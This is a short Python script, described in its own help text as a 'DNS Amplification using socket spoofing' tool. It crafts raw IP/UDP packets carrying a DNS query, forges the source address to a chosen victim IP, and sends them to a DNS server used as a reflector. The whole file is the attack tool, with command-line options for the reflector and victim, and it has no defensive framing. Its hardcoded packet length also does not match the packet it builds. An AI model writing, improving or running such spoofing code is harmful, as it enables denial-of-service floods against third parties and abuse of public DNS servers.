import socket
import argparse

def craft_dns_query():
    # DNS query: A record for example.com with ID 0xaabb
    return (
        b'\xaa\xbb'         # Transaction ID
        b'\x01\x00'         # Standard Query with Recursion Desired
        b'\x00\x01'         # QDCOUNT (1 question)
        b'\x00\x00'         # ANCOUNT
        b'\x00\x00'         # NSCOUNT
        b'\x00\x00'         # ARCOUNT
        b'\x07example'      # QNAME: "example"
        b'\x03com'          # QNAME continued: "com"
        b'\x00'             # Null byte to end QNAME
        b'\x00\x01'         # QTYPE: A
        b'\x00\x01'         # QCLASS: IN
    )

def send_spoofed_dns(reflector_ip, victim_ip, port=53):
    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

    # IP header fields
    ip_header = b''
    ip_header += b'\x45'            # Version + IHL
    ip_header += b'\x00'            # TOS
    ip_header += b'\x00\x3c'        # Total length (60 bytes)
    ip_header += b'\xab\xcd'        # Identification
    ip_header += b'\x00\x00'        # Flags/Fragment offset
    ip_header += b'\x40'            # TTL
    ip_header += b'\x11'            # Protocol: UDP
    ip_header += b'\x00\x00'        # Header checksum (ignore, let OS fill in)
    ip_header += socket.inet_aton(victim_ip)    # Spoofed source IP
    ip_header += socket.inet_aton(reflector_ip) # Destination (DNS server)

    # UDP header
    udp_header = b''
    udp_header += b'\x04\xd2'       # Source port (1234)
    udp_header += bytes([port >> 8, port & 0xff])  # Destination port (53)
    dns_query = craft_dns_query()
    udp_length = 8 + len(dns_query)
    udp_header += bytes([udp_length >> 8, udp_length & 0xff])  # Length
    udp_header += b'\x00\x00'       # Checksum (set to 0)

    # Final packet
    packet = ip_header + udp_header + dns_query

    # Send spoofed packet
    raw_socket.sendto(packet, (reflector_ip, port))
    print(f"[+] Sent spoofed DNS packet from {victim_ip} to {reflector_ip}:{port}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS Amplification using socket spoofing")
    parser.add_argument("reflector_ip", help="IP of the DNS server to reflect from")
    parser.add_argument("--victim_ip", help="Victim IP to spoof", default=None)

    args = parser.parse_args()
    victim_ip = args.victim_ip if args.victim_ip else socket.gethostbyname(socket.gethostname())

    send_spoofed_dns(args.reflector_ip, victim_ip)

